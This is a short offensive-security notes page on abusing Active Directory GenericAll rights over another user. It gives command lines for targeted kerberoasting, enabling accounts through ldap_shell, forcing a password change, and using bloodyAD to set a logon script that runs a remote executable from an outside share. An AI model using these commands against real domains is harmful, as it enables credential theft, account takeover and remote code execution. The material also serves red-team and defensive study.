# Abusing GenericAll (User over User)

If an user have GenericAll over an user can get user NT hash, enable/disable user, change password, and change user properties, this properties include change logon script wich allos for RCE if user connects. It is recomende to first, get the nt hash (or if not possible kerberos hash), then check if user conects frequently, and if both ways are not allowed go for changing the password.


### Shadow credentials attack (get NThash):

Check Shadow credentials seccion -> https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/AddKeyCredentialLink%20(SHADOW%20CREDENTIALS).md

<br>

### Target kerberoast (get kerberoast hash):

You can make the user kerberoastable. User is required to be enabled. If it's not, enable it first. Additionally may require to sinc datetime with DC for kerberos interaction.

`targetedKerberoast.py -v -d '<domain>' -u '<controlled user>' -p '<controlled user password>'`

source: https://github.com/ShutdownRepo/targetedKerberoast

<br>

### Enable user, or change properties:
#### (externally, from attacking machine)

You can enable/disable user and change other properties. The easiest way to do it is using ldap_shell externally. 

`ldap_shell.py '<domain>/<user you control>:<password>' -dc-ip <ip>`

When inside use the interactive shell to change properties. Example "enable_account <user>".

Source: https://github.com/PShlyundin/ldap_shell

<br>

#### (internally, inside victim machine)

You can also modify those properties from inside windows machine using Set-DomainObject or Powerview.

Set-DomainObject: https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/

Powerview: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1 

<br>

### Set logon script (get RCE if user login):
#### (externally, from attacking machine)

You can force the user to execute specific program or script, and if user logs into the system, that program will be executed.

`bloodyAD --host '<dc_ip>' -d '<domain>' -u '<controlled user>' -p '<password>' set object <target user> msTSInitialProgram -v '\\1.2.3.4\share\file.exe'`

Source: https://www.thehacker.recipes/ad/movement/dacl/logon-script

<br>

#### (internally, inside victim machine)

You can also do the same internally using Powerview or Set-DomainObject.

Source: https://legacy.thehacker.recipes/a-d/movement/dacl/logon-script

<br>

### Change user password (Force Change Password):

You can change user password remotly and then use it to connect via winrm, rdp etc...

Check Force Change Password seccion -> https://github.com/ArtesOscuras/Notes/blob/main/abusing_DACLs/ForceChangePassword.md

<br>



